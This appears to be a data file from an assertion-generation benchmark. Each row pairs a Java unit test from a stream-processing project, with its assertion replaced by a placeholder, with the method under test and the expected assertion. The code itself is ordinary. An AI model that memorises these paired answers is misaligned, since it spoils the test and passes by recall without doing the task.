canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!sourceName.equals(COMPATIBLE_SOURCE) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertTrue(provider.canProvide())
"shouldNotProvideSimpleGroupDeserializerWhenSourceNameIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  SimpleGroupDeserializerProvider provider = new SimpleGroupDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!sourceName.equals(COMPATIBLE_SOURCE) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldNotProvideSimpleGroupDeserializerWhenSchemaTypeIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON"");  SimpleGroupDeserializerProvider provider = new SimpleGroupDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!sourceName.equals(COMPATIBLE_SOURCE) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldReturnSimpleGroupDeserializerForSupportedSourceNameAndSchemaType() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor());  SimpleGroupDeserializerProvider provider = new SimpleGroupDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator); DaggerDeserializer<Row> daggerDeserializer = provider.getDaggerDeserializer();  ""<AssertPlaceHolder>""; }
getDaggerDeserializer() { int timestampFieldIndex = Integer.parseInt(streamConfig.getEventTimestampFieldIndex()); String protoClassName = streamConfig.getProtoClass(); String rowTimeAttributeName = configuration.getString(Constants.FLINK_ROWTIME_ATTRIBUTE_NAME_KEY, Constants.FLINK_ROWTIME_ATTRIBUTE_NAME_DEFAULT); return new SimpleGroupDeserializer(protoClassName, timestampFieldIndex, rowTimeAttributeName, stencilClientOrchestrator); }"	assertTrue(daggerDeserializer instanceof SimpleGroupDeserializer)
"shouldReturnErrorTelemetryFormConfigOnly() { ErrorReporter errorReporter = ErrorReporterFactory.getErrorReporter(runtimeContext.getMetricGroup(), configuration); ""<AssertPlaceHolder>""; }
getErrorReporter(MetricGroup metricGroup, Configuration configuration) { long shutDownPeriod = configuration.getLong(Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_KEY, Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_DEFAULT); boolean telemetryEnabled = configuration.getBoolean(Constants.METRIC_TELEMETRY_ENABLE_KEY, Constants.METRIC_TELEMETRY_ENABLE_VALUE_DEFAULT); return getErrorReporter(metricGroup, telemetryEnabled, shutDownPeriod); }"	assertEquals(errorReporter.getClass(), ErrorStatsReporter.class)
"shouldReturnErrorTelemetryFormMetricGroup() { ErrorReporter errorReporter = ErrorReporterFactory.getErrorReporter(metricGroup, configuration); ""<AssertPlaceHolder>""; }
getErrorReporter(MetricGroup metricGroup, Configuration configuration) { long shutDownPeriod = configuration.getLong(Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_KEY, Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_DEFAULT); boolean telemetryEnabled = configuration.getBoolean(Constants.METRIC_TELEMETRY_ENABLE_KEY, Constants.METRIC_TELEMETRY_ENABLE_VALUE_DEFAULT); return getErrorReporter(metricGroup, telemetryEnabled, shutDownPeriod); }"	assertEquals(errorReporter.getClass(), ErrorStatsReporter.class)
"shouldReturnErrorStatsReporterIfTelemetryEnabled() { ErrorReporter errorReporter = ErrorReporterFactory.getErrorReporter(runtimeContext.getMetricGroup(), true, 0L); ""<AssertPlaceHolder>""; }
getErrorReporter(MetricGroup metricGroup, Boolean telemetryEnable, long shutDownPeriod) { if (telemetryEnable) { return new ErrorStatsReporter(metricGroup, shutDownPeriod); } else { return new NoOpErrorReporter(); } }"	assertEquals(errorReporter.getClass(), ErrorStatsReporter.class)
"shouldReturnNoOpReporterIfTelemetryDisabled() { ErrorReporter errorReporter = ErrorReporterFactory.getErrorReporter(runtimeContext.getMetricGroup(), false, 0L); ""<AssertPlaceHolder>""; }
getErrorReporter(MetricGroup metricGroup, Boolean telemetryEnable, long shutDownPeriod) { if (telemetryEnable) { return new ErrorStatsReporter(metricGroup, shutDownPeriod); } else { return new NoOpErrorReporter(); } }"	assertEquals(errorReporter.getClass(), NoOpErrorReporter.class)
"shouldSetHostNameAsDefinedInFlinkConfiguration() { ConfigOption<String> hostConfigOption = ConfigOptions .key(""metrics.reporter.stsd.host"") .stringType() .defaultValue(""localhost""); when(flinkConfiguration.getString(hostConfigOption)).thenReturn(""my-host"");  DaggerMetricsConfig daggerMetricsConfig = new DaggerMetricsConfig(flinkConfiguration); ""<AssertPlaceHolder>""; }
getMetricStatsDHost() { return hostName; }"	"assertEquals(""my-host"", daggerMetricsConfig.getMetricStatsDHost())"
"shouldUseDefaultHostNameWhenNotDefinedInFlinkConfiguration() { DaggerMetricsConfig daggerMetricsConfig = new DaggerMetricsConfig(new Configuration()); ""<AssertPlaceHolder>""; }
getMetricStatsDHost() { return hostName; }"	"assertEquals(""localhost"", daggerMetricsConfig.getMetricStatsDHost())"
"shouldSetPortNumberAsDefinedInFlinkConfiguration() { ConfigOption<Integer> portConfigOption = ConfigOptions .key(""metrics.reporter.stsd.port"") .intType() .defaultValue(8125); when(flinkConfiguration.getInteger(portConfigOption)).thenReturn(9010);  DaggerMetricsConfig daggerMetricsConfig = new DaggerMetricsConfig(flinkConfiguration); ""<AssertPlaceHolder>""; }
getMetricStatsDPort() { return port; }"	assertEquals(9010, daggerMetricsConfig.getMetricStatsDPort().intValue())
"shouldUseDefaultPortWhenNotDefinedInFlinkConfiguration() { DaggerMetricsConfig daggerMetricsConfig = new DaggerMetricsConfig(new Configuration()); ""<AssertPlaceHolder>""; }
getMetricStatsDPort() { return port; }"	assertEquals(8125, daggerMetricsConfig.getMetricStatsDPort().intValue())
"shouldReturnEmptyStringAsTags() { DaggerMetricsConfig daggerMetricsConfig = new DaggerMetricsConfig(new Configuration()); ""<AssertPlaceHolder>""; }
getMetricStatsDTags() { return """"; }"	"assertEquals("""", daggerMetricsConfig.getMetricStatsDTags())"
"shouldReturnFormattedTagWithKeyValueSeparatedByDelimiter() { StatsDTag statsDTag = new StatsDTag(""tag-key"", ""tag-value"");  ""<AssertPlaceHolder>""; }
getFormattedTag() { if (tagValue.equals(NIL_TAG_VALUE)) { return tagKey; } else { return String.format(""%s=%s"", tagKey, tagValue); } }"	"assertEquals(""tag-key=tag-value"", statsDTag.getFormattedTag())"
"shouldReturnFormattedTagWithOnlyTagKey() { StatsDTag statsDTag = new StatsDTag(""my-tag"");  ""<AssertPlaceHolder>""; }
getFormattedTag() { if (tagValue.equals(NIL_TAG_VALUE)) { return tagKey; } else { return String.format(""%s=%s"", tagKey, tagValue); } }"	"assertEquals(""my-tag"", statsDTag.getFormattedTag())"
"shouldReturnFormattedTagWithOnlyTagKeyWhenTagValueIsNull() { StatsDTag statsDTag = new StatsDTag(""my-tag"", null);  ""<AssertPlaceHolder>""; }
getFormattedTag() { if (tagValue.equals(NIL_TAG_VALUE)) { return tagKey; } else { return String.format(""%s=%s"", tagKey, tagValue); } }"	"assertEquals(""my-tag"", statsDTag.getFormattedTag())"
"shouldReturnFormattedTagWithOnlyTagKeyWhenTagValueIsEmpty() { StatsDTag statsDTag = new StatsDTag(""my-tag"", """");  ""<AssertPlaceHolder>""; }
getFormattedTag() { if (tagValue.equals(NIL_TAG_VALUE)) { return tagKey; } else { return String.format(""%s=%s"", tagKey, tagValue); } }"	"assertEquals(""my-tag"", statsDTag.getFormattedTag())"
"shouldNotBeAbleToProcessWhenConfigIsNull() { ParentPostProcessor parentPostProcessor = new ParentPostProcessor(daggerContext, null, telemetrySubscriber); ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig config) { return config != null && !config.isEmpty(); }"	assertFalse(parentPostProcessor.canProcess(null))
"shouldNotBeAbleToProcessWhenConfigIsEmpty() { ParentPostProcessor parentPostProcessor = new ParentPostProcessor(daggerContext, null, telemetrySubscriber); PostProcessorConfig mockConfig = mock(PostProcessorConfig.class); when(mockConfig.isEmpty()).thenReturn(true); ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig config) { return config != null && !config.isEmpty(); }"	assertFalse(parentPostProcessor.canProcess(mockConfig))
"shouldBeAbleToProcessWhenConfigIsNotEmpty() { ParentPostProcessor parentPostProcessor = new ParentPostProcessor(daggerContext, null, telemetrySubscriber); PostProcessorConfig mockConfig = mock(PostProcessorConfig.class); when(mockConfig.isEmpty()).thenReturn(false); ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig config) { return config != null && !config.isEmpty(); }"	assertTrue(parentPostProcessor.canProcess(mockConfig))
"shouldParseGivenConfiguration() { defaultPostProcessorConfig = PostProcessorConfig.parse(defaultConfiguration);  ""<AssertPlaceHolder>""; }
parse(String configuration) { PostProcessorConfig postProcessorConfig; try { Type typeToken = new TypeToken<PostProcessorConfig>() { }.getType(); postProcessorConfig = GSON.fromJson(configuration, typeToken); } catch (JsonSyntaxException exception) { throw new InvalidJsonException(""Invalid JSON Given for "" + Constants.PROCESSOR_POSTPROCESSOR_CONFIG_KEY); }  return postProcessorConfig; }"	assertNotNull(defaultPostProcessorConfig)
"shouldReturnColumns() { defaultPostProcessorConfig = PostProcessorConfig.parse(defaultConfiguration); ArrayList<String> expectedColumnNames = new ArrayList<>(); expectedColumnNames.add(""surge_factor""); expectedColumnNames.add(""customer_profile""); expectedColumnNames.add(""event_timestamp""); expectedColumnNames.add(""s2_id_level"");  ""<AssertPlaceHolder>""; }
getOutputColumnNames() { List<String> outputColumnNames = new ArrayList<>(); if (externalSource != null && !externalSource.isEmpty()) { outputColumnNames.addAll(externalSource.getOutputColumnNames()); } if (internalSource != null && !internalSource.isEmpty()) { internalSource.forEach(config -> outputColumnNames.add(config.getOutputField())); } return outputColumnNames; }"	assertArrayEquals(expectedColumnNames.toArray(), defaultPostProcessorConfig.getOutputColumnNames().toArray())
"shouldReturnHttpExternalSourceConfig() { defaultPostProcessorConfig = PostProcessorConfig.parse(defaultConfiguration); HashMap<String, OutputMapping> outputMappings; OutputMapping outputMapping; HashMap<String, String> headerMap; headerMap = new HashMap<>(); headerMap.put(""content-type"", ""application/json""); outputMappings = new HashMap<>(); outputMapping = new OutputMapping(""$.data.tensor.values[0]""); outputMappings.put(""surge_factor"", outputMapping);  HttpSourceConfig httpSourceConfig = new HttpSourceConfig(""http://localhost:8000"", """", ""post"", null, null, null, null, ""5000"", ""5000"", true, null, null, headerMap, outputMappings, null, false);  ""<AssertPlaceHolder>""; }
getExternalSource() { return externalSource; }"	assertEquals(httpSourceConfig, defaultPostProcessorConfig.getExternalSource().getHttpConfig().get(0))
"shouldReturnEsExternalSourceConfig() { defaultPostProcessorConfig = PostProcessorConfig.parse(defaultConfiguration); HashMap<String, OutputMapping> outputMappings; OutputMapping outputMapping; outputMappings = new HashMap<>(); outputMapping = new OutputMapping(""$._source""); outputMappings.put(""customer_profile"", outputMapping);  EsSourceConfig esSourceConfig = new EsSourceConfig(""localhost"", ""9200"", null, null, ""/customers/customer/%s"", ""customer_id"", ""TestLogMessage"", null, null, ""5000"", ""6000"", ""5000"", false, outputMappings, null, false);  ""<AssertPlaceHolder>""; }
getExternalSource() { return externalSource; }"	assertEquals(esSourceConfig, defaultPostProcessorConfig.getExternalSource().getEsConfig().get(0))
"shouldBeEmptyWhenNoneOfTheConfigsExist() { defaultPostProcessorConfig = new PostProcessorConfig(null, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertTrue(defaultPostProcessorConfig.isEmpty())
"shouldNotBeEmptyWhenExternalSourceHasHttpConfigExist() { ArrayList<HttpSourceConfig> http = new ArrayList<>(); http.add(new HttpSourceConfig("""", """", """", """", """", """", """", """", """", false, """", """", new HashMap<>(), new HashMap<>(), ""metricId_01"", false)); ArrayList<EsSourceConfig> es = new ArrayList<>(); ArrayList<PgSourceConfig> pg = new ArrayList<>(); ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, new ArrayList<>()); defaultPostProcessorConfig = new PostProcessorConfig(externalSourceConfig, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertFalse(defaultPostProcessorConfig.isEmpty())
"shouldNotBeEmptyWhenExternalSourceHasEsConfigExist() { ArrayList<HttpSourceConfig> http = new ArrayList<>(); ArrayList<PgSourceConfig> pg = new ArrayList<>(); ArrayList<EsSourceConfig> es = new ArrayList<>(); es.add(new EsSourceConfig("""", """", """", """", """", """", """", """", """", """", """", """", false, new HashMap<>(), ""metricId_01"", false)); ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, new ArrayList<>()); defaultPostProcessorConfig = new PostProcessorConfig(externalSourceConfig, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertFalse(defaultPostProcessorConfig.isEmpty())
"shouldNotBeEmptyWhenExternalSourceHasPgConfigExist() { ArrayList<HttpSourceConfig> http = new ArrayList<>(); ArrayList<EsSourceConfig> es = new ArrayList<>(); ArrayList<PgSourceConfig> pg = new ArrayList<>(); pg.add(new PgSourceConfig("""", """", """", """", """", """", """", """", new HashMap<>(), """", """", """", """", true, ""metricId_01"", false)); ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, new ArrayList<>()); defaultPostProcessorConfig = new PostProcessorConfig(externalSourceConfig, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertFalse(defaultPostProcessorConfig.isEmpty())
"shouldBeEmptyWhenExternalSourceHasEmptyConfig() { ArrayList<HttpSourceConfig> http = new ArrayList<>(); ArrayList<EsSourceConfig> es = new ArrayList<>(); ArrayList<PgSourceConfig> pg = new ArrayList<>(); ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, new ArrayList<>()); defaultPostProcessorConfig = new PostProcessorConfig(externalSourceConfig, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertTrue(defaultPostProcessorConfig.isEmpty())
"shouldNotBeEmptyWhenInternalSourceExist() { ArrayList<InternalSourceConfig> internalSourceConfigs = new ArrayList<>(); internalSourceConfigs.add(new InternalSourceConfig(""outputField"", ""value"", ""type"", null)); defaultPostProcessorConfig = new PostProcessorConfig(null, null, internalSourceConfigs);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertFalse(defaultPostProcessorConfig.isEmpty())
"shouldNotBeEmptyWhenTransformConfigsExist() { transformConfigs.add(new TransformConfig(""testClass"", new HashMap<>())); defaultPostProcessorConfig = new PostProcessorConfig(null, transformConfigs, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return !hasTransformConfigs() && !hasExternalSource() && !hasInternalSource(); }"	assertFalse(defaultPostProcessorConfig.isEmpty())
"shouldReturnExternalSourceConfig() { defaultPostProcessorConfig = new PostProcessorConfig(defaultExternalSourceConfig, null, defaultInternalSource);  ""<AssertPlaceHolder>""; }
getExternalSource() { return externalSource; }"	assertEquals(defaultExternalSourceConfig, defaultPostProcessorConfig.getExternalSource())
"shouldReturnInternalSourceConfig() { defaultPostProcessorConfig = new PostProcessorConfig(defaultExternalSourceConfig, null, defaultInternalSource); ""<AssertPlaceHolder>""; }
getInternalSource() { return internalSource; }"	assertEquals(defaultInternalSource, defaultPostProcessorConfig.getInternalSource())
"shouldReturnTransformConfigs() { Map<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""keyValue"", ""key""); transformConfigs.add(new TransformConfig(""test.postprocessor.XTransformer"", transformationArguments)); defaultPostProcessorConfig = new PostProcessorConfig(null, transformConfigs, defaultInternalSource); ""<AssertPlaceHolder>""; }
getTransformers() { return transformers; }"	assertEquals(transformConfigs, defaultPostProcessorConfig.getTransformers())
"shouldBeTrueWhenExternalSourceExists() { ArrayList<HttpSourceConfig> http = new ArrayList<>(); ArrayList<PgSourceConfig> pg = new ArrayList<>(); ArrayList<EsSourceConfig> es = new ArrayList<>(); es.add(new EsSourceConfig("""", """", """", """", """", """", """", """", """", """", """", """", false, new HashMap<>(), ""metricId_01"", false)); ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, new ArrayList<>()); defaultPostProcessorConfig = new PostProcessorConfig(externalSourceConfig, null, defaultInternalSource); ""<AssertPlaceHolder>""; }
hasExternalSource() { return externalSource != null && !externalSource.isEmpty(); }"	assertTrue(defaultPostProcessorConfig.hasExternalSource())
"shouldBeFalseWhenExternalSourceDoesNotExists() { defaultPostProcessorConfig = new PostProcessorConfig(null, null, defaultInternalSource); ""<AssertPlaceHolder>""; }
hasExternalSource() { return externalSource != null && !externalSource.isEmpty(); }"	assertFalse(defaultPostProcessorConfig.hasExternalSource())
"shouldNotHaveInternalSourceWhenInternalSourceIsEmpty() { defaultPostProcessorConfig = new PostProcessorConfig(defaultExternalSourceConfig, null, defaultInternalSource); ""<AssertPlaceHolder>""; }
hasInternalSource() { return internalSource != null && !internalSource.isEmpty(); }"	assertFalse(defaultPostProcessorConfig.hasInternalSource())
"shouldHaveInternalSourceWhenInternalSourceIsNotEmpty() { ArrayList<InternalSourceConfig> internalSource = new ArrayList<>(); internalSource.add(new InternalSourceConfig(""outputField"", ""value"", ""type"", null)); defaultPostProcessorConfig = new PostProcessorConfig(defaultExternalSourceConfig, null, this.defaultInternalSource); ""<AssertPlaceHolder>""; }
hasInternalSource() { return internalSource != null && !internalSource.isEmpty(); }"	assertFalse(defaultPostProcessorConfig.hasInternalSource())
"shouldBeFalseWhenInternalSourceDoesNotExists() { defaultPostProcessorConfig = new PostProcessorConfig(defaultExternalSourceConfig, null, null); ""<AssertPlaceHolder>""; }
hasInternalSource() { return internalSource != null && !internalSource.isEmpty(); }"	assertFalse(defaultPostProcessorConfig.hasInternalSource())
"shouldBeTrueWhenTransformerSourceExists() { Map<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""keyValue"", ""key""); transformConfigs.add(new TransformConfig(""test.postprocessor.XTransformer"", transformationArguments)); defaultPostProcessorConfig = new PostProcessorConfig(null, transformConfigs, defaultInternalSource); ""<AssertPlaceHolder>""; }
hasTransformConfigs() { return transformers != null && !transformers.isEmpty(); }"	assertTrue(defaultPostProcessorConfig.hasTransformConfigs())
"shouldBeFalseWhenTransformerSourceDoesNotExists() { defaultPostProcessorConfig = new PostProcessorConfig(null, null, defaultInternalSource); ""<AssertPlaceHolder>""; }
hasTransformConfigs() { return transformers != null && !transformers.isEmpty(); }"	assertFalse(defaultPostProcessorConfig.hasTransformConfigs())
"shouldReturnTrueForHasSQLTransformerIfTransformConfigContainsSqlTransformer() { String configuration = ""{ ""external_source"": { ""es"": [ { ""host"": ""localhost:9200"", ""output_mapping"": { ""customer_profile"": { ""path"": ""$._source"" } }, ""query_param_pattern"": ""/customers/customer/%s"", ""query_param_variables"": ""customer_id"", ""retry_timeout"": ""5000"", ""socket_timeout"": ""6000"", ""stream_timeout"": ""5000"", ""type"": ""TestLogMessage"" } ], ""http"": [ { ""body_column_from_sql"": ""request_body"", ""connect_timeout"": ""5000"", ""endpoint"": ""http://localhost:8000"", ""fail_on_errors"": ""true"", ""headers"": { ""content-type"": ""application/json"" }, ""output_mapping"": { ""surge_factor"": { ""path"": ""$.data.tensor.values[0]"" } }, ""stream_timeout"": ""5000"", ""verb"": ""post"" } ] }, ""internal_source"":[ { ""output_field"": ""event_timestamp"", ""value"": ""CURRENT_TIMESTAMP"", ""type"": ""function"" }, { ""output_field"": ""s2_id_level"", ""value"": ""7"", ""type"": ""constant"" } ], ""transformers"": [ { ""transformation_arguments"": { ""sqlQuery"": ""SELECT * from data_stream"" }, ""transformation_class"": ""SQLTransformer"" } ] }""; PostProcessorConfig postProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
hasSQLTransformer() { return hasTransformConfigs() && transformers .stream() .anyMatch(transformConfig -> transformConfig .getTransformationClass() .equals(Constants.SQL_TRANSFORMER_CLASS)); }"	assertTrue(postProcessorConfig.hasSQLTransformer())
"shouldNotReturnTrueForHasSQLTransformerIfTransformConfigDoesNotContainSqlTransformer() { String configuration = ""{ ""external_source"": { ""es"": [ { ""host"": ""localhost:9200"", ""output_mapping"": { ""customer_profile"": { ""path"": ""$._source"" } }, ""query_param_pattern"": ""/customers/customer/%s"", ""query_param_variables"": ""customer_id"", ""retry_timeout"": ""5000"", ""socket_timeout"": ""6000"", ""stream_timeout"": ""5000"", ""type"": ""TestLogMessage"" } ], ""http"": [ { ""body_column_from_sql"": ""request_body"", ""connect_timeout"": ""5000"", ""endpoint"": ""http://localhost:8000"", ""fail_on_errors"": ""true"", ""headers"": { ""content-type"": ""application/json"" }, ""output_mapping"": { ""surge_factor"": { ""path"": ""$.data.tensor.values[0]"" } }, ""stream_timeout"": ""5000"", ""verb"": ""post"" } ] }, ""internal_source"":[ { ""output_field"": ""event_timestamp"", ""value"": ""CURRENT_TIMESTAMP"", ""type"": ""function"" }, { ""output_field"": ""s2_id_level"", ""value"": ""7"", ""type"": ""constant"" } ], ""transformers"": [ { ""transformation_arguments"": { ""sqlQuery"": ""SELECT * from data_stream"" }, ""transformation_class"": ""org.raystack.dagger.transformer.DeDuplicationTransformer"" } ] }""; defaultPostProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
hasSQLTransformer() { return hasTransformConfigs() && transformers .stream() .anyMatch(transformConfig -> transformConfig .getTransformationClass() .equals(Constants.SQL_TRANSFORMER_CLASS)); }"	assertFalse(defaultPostProcessorConfig.hasSQLTransformer())
"shouldNotReturnTrueForHasSQLTransformerIfTransformConfigDoesNotExist() { String configuration = ""{ ""external_source"": { ""es"": [ { ""host"": ""localhost:9200"", ""output_mapping"": { ""customer_profile"": { ""path"": ""$._source"" } }, ""query_param_pattern"": ""/customers/customer/%s"", ""query_param_variables"": ""customer_id"", ""retry_timeout"": ""5000"", ""socket_timeout"": ""6000"", ""stream_timeout"": ""5000"", ""type"": ""TestLogMessage"" } ], ""http"": [ { ""body_column_from_sql"": ""request_body"", ""connect_timeout"": ""5000"", ""endpoint"": ""http://localhost:8000"", ""fail_on_errors"": ""true"", ""headers"": { ""content-type"": ""application/json"" }, ""output_mapping"": { ""surge_factor"": { ""path"": ""$.data.tensor.values[0]"" } }, ""stream_timeout"": ""5000"", ""verb"": ""post"" } ] }, ""internal_source"":[ { ""output_field"": ""event_timestamp"", ""value"": ""CURRENT_TIMESTAMP"", ""type"": ""function"" }, { ""output_field"": ""s2_id_level"", ""value"": ""7"", ""type"": ""constant"" } ] }""; defaultPostProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
hasSQLTransformer() { return hasTransformConfigs() && transformers .stream() .anyMatch(transformConfig -> transformConfig .getTransformationClass() .equals(Constants.SQL_TRANSFORMER_CLASS)); }"	assertFalse(defaultPostProcessorConfig.hasSQLTransformer())
"shouldReturnTrueForHasSQLTransformerIfAnyOneTransformConfigContainsSQLTransformer() { String configuration = ""{ ""external_source"": { ""es"": [ { ""host"": ""localhost:9200"", ""output_mapping"": { ""customer_profile"": { ""path"": ""$._source"" } }, ""query_param_pattern"": ""/customers/customer/%s"", ""query_param_variables"": ""customer_id"", ""retry_timeout"": ""5000"", ""socket_timeout"": ""6000"", ""stream_timeout"": ""5000"", ""type"": ""TestLogMessage"" } ], ""http"": [ { ""body_column_from_sql"": ""request_body"", ""connect_timeout"": ""5000"", ""endpoint"": ""http://localhost:8000"", ""fail_on_errors"": ""true"", ""headers"": { ""content-type"": ""application/json"" }, ""output_mapping"": { ""surge_factor"": { ""path"": ""$.data.tensor.values[0]"" } }, ""stream_timeout"": ""5000"", ""verb"": ""post"" } ] }, ""internal_source"":[ { ""output_field"": ""event_timestamp"", ""value"": ""CURRENT_TIMESTAMP"", ""type"": ""function"" }, { ""output_field"": ""s2_id_level"", ""value"": ""7"", ""type"": ""constant"" } ], ""transformers"": [ { ""transformation_arguments"": { ""sqlQuery"": ""SELECT * from data_stream"" }, ""transformation_class"": ""SQLTransformer"" }, { ""transformation_arguments"": { ""arg1"": ""test"" }, ""transformation_class"": ""org.raystack.dagger.transformer.Test"" } ] }""; defaultPostProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
hasSQLTransformer() { return hasTransformConfigs() && transformers .stream() .anyMatch(transformConfig -> transformConfig .getTransformationClass() .equals(Constants.SQL_TRANSFORMER_CLASS)); }"	assertTrue(defaultPostProcessorConfig.hasSQLTransformer())
"shouldParseInternalProcessorConfigForInternalSourceConfig() { String configuration = ""{""internal_source"":[{""output_field"":""payload"",""value"":""JSON_PAYLOAD"",""type"":""function"",""internal_processor_config"":{""schema_proto_class"":""com.foo.bar.RestaurantMessage""}}]}""; PostProcessorConfig postProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
getInternalSource() { return internalSource; }"	assertNotNull(postProcessorConfig.getInternalSource().get(0).getInternalProcessorConfig())
"shouldParseEndpointVariablesConfig() { String configuration = ""{""external_source"":{""es"":[{""host"":""localhost"",""port"":""9200"",""output_mapping"":{""customer_profile"":{""path"":""$._source""}},""endpoint_pattern"":""/customers/customer/%s"",""endpoint_variables"":""customer_id"",""retry_timeout"":""5000"",""socket_timeout"":""6000"",""stream_timeout"":""5000"",""type"":""TestLogMessage""}],""http"":[{""body_column_from_sql"":""request_body"",""connect_timeout"":""5000"",""endpoint"":""http://localhost:8000/%s"",""endpoint_variables"":""some-id"",""fail_on_errors"":""true"",""headers"":{""content-type"":""application/json""},""output_mapping"":{""surge_factor"":{""path"":""$.data.tensor.values[0]""}},""stream_timeout"":""5000"",""verb"":""put""}]},""internal_source"":[{""output_field"":""event_timestamp"",""value"":""CURRENT_TIMESTAMP"",""type"":""function""},{""output_field"":""s2_id_level"",""value"":""7"",""type"":""constant""}],""transformers"":[{""transformation_arguments"":{""keyColumnName"":""s2id"",""valueColumnName"":""features""},""transformation_class"":""test.postprocessor.FeatureTransformer""}]}""; PostProcessorConfig postProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
getExternalSource() { return externalSource; }"	"assertEquals(""some-id"", postProcessorConfig.getExternalSource().getHttpConfig().get(0).getEndpointVariables())"
"shouldParseEmptyEndpointVariablesConfig() { String configuration = ""{""external_source"":{""es"":[{""host"":""localhost"",""port"":""9200"",""output_mapping"":{""customer_profile"":{""path"":""$._source""}},""endpoint_pattern"":""/customers/customer/%s"",""endpoint_variables"":""customer_id"",""retry_timeout"":""5000"",""socket_timeout"":""6000"",""stream_timeout"":""5000"",""type"":""TestLogMessage""}],""http"":[{""body_column_from_sql"":""request_body"",""connect_timeout"":""5000"",""endpoint"":""http://localhost:8000/%s"",""fail_on_errors"":""true"",""headers"":{""content-type"":""application/json""},""output_mapping"":{""surge_factor"":{""path"":""$.data.tensor.values[0]""}},""stream_timeout"":""5000"",""verb"":""put""}]},""internal_source"":[{""output_field"":""event_timestamp"",""value"":""CURRENT_TIMESTAMP"",""type"":""function""},{""output_field"":""s2_id_level"",""value"":""7"",""type"":""constant""}],""transformers"":[{""transformation_arguments"":{""keyColumnName"":""s2id"",""valueColumnName"":""features""},""transformation_class"":""test.postprocessor.FeatureTransformer""}]}""; PostProcessorConfig postProcessorConfig = PostProcessorConfig.parse(configuration); ""<AssertPlaceHolder>""; }
getExternalSource() { return externalSource; }"	assertEquals(null, postProcessorConfig.getExternalSource().getHttpConfig().get(0).getEndpointVariables())
